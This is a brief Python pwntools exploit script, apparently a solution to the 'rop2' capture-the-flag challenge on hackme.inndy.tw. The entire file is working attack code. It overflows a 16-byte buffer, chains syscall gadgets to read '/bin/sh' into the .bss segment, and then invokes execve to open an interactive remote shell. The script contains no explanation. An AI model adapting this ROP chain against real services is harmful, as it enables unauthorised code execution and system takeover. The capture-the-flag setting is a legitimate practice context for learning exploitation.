# -*- coding: utf-8 -*-

#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'Flyour'

from pwn import *

context(terminal=['gnome-terminal', '-x', 'sh', '-c'], arch='i386', os='linux', log_level='debug')

def debug(addr='0x08048484'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

shellcode = "/bin/sh\0"

elf = ELF('./rop2')
syscall_addr = elf.symbols["syscall"]
bss_addr = elf.bss()
ppppr_addr = 0x8048578
print "syscall: %x" % syscall_addr
print "bss_addr: %x" % bss_addr
print "ppppr_addr: %x" % ppppr_addr

# io = process('./rop2')
io = remote('hackme.inndy.tw', 7703)


# debug()

payload = "a" * 16
payload += p32(syscall_addr)
payload += p32(ppppr_addr)
payload += p32(3)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(8)
payload += p32(syscall_addr)
payload += p32(ppppr_addr)
payload += p32(11)
payload += p32(bss_addr)
payload += p32(0)
payload += p32(0)

io.send(payload)
io.send(shellcode)
io.interactive()

io.close()
